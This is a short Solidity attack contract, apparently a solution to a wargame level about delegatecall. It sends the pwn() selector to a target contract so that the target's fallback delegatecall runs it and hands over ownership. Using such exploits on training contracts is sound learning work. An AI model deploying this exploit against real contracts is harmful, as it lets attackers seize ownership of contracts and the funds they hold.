// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DelegateAttack {
    constructor() {}

    function getSelector() public pure returns(bytes4) {
        return bytes4(keccak256(bytes("pwn()")));
    }


    // Call the delegation instance to trigger the fallback function.
    // While sending this transaction, add function selector of pwn() as msg.data
    function attack(address contractAddress) public returns(bytes memory) {
        (bool success, bytes memory data) = contractAddress.call(abi.encodeWithSignature("pwn()"));
        require(success);
        return data;
    } 
}